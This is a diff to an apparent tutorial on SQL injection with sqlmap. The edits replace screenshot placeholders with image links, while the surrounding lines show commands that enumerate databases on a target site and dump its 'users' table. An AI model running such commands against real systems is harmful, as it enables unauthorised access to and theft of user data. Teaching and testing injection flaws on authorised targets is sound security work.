@@ -9,7 +9,7 @@ use simple payloads to make sure site is vulnerable.
  
 Open Browser and take your targeted website and give some random username and password and wait to hit login 
 
-screen shotb1
+![image](/screenshots/Browser1.png)
 
 ### Step 2.
 
@@ -28,7 +28,7 @@ Now open sqlmap tool in your system terminal.
 
 >sqlmap
 
-screenshot 1
+![image](/screenshots/SQL1.png)
 
 >sqlmap -r sql1 http://phone.com/index.php -dbs
 
@@ -40,7 +40,7 @@ dbs  --  Databases
 Give Yes to all search fields. 
 then if its is vulnerable then you can see as below
 
-screen 2
+![image](/screenshots/SQL2.png)
 
 >sqlmap -r sql1 http://phone.com/index.php -D phone -T users --dump
 
@@ -52,8 +52,8 @@ T     -  Table
 users - Tale names
 dump  - dumping total data in table called users.
 
-screen 3
-screen 4
+![image](/screenshots/SQL3.png)
+![image](/screenshots/SQL4.png)
 
 
 
